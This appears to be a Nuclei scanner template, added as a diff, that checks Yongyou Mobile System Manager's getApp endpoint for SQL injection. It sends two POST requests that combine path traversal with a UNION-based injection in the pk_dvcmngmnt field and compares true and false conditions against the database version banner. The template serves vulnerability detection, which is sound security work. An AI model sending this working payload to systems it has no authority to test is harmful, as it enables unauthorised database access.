@@ -1,0 +1,43 @@
+id: poc-yaml-yongyou-mobile-manager-getapp-sqli
+info:
+  name: Yongyou Mobile System Manager getApp SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /mobsm/common/../appManage/getApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pk_dvcmngmnt=0' union select banner,'test+SQLi','123',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from sys.v_$version where 1=0--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[]"
+        part: body
+  - raw:
+      - |
+        POST /mobsm/common/../appManage/getApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pk_dvcmngmnt=0' union select banner,'test+SQLi','123',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from sys.v_$version where 1=1--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"pk_dvcmngmnt\""
+          - "\"primaryKey\""
+          - "\"attributeNames\""
+          - "\"tableName\""
+        condition: and
+        part: body
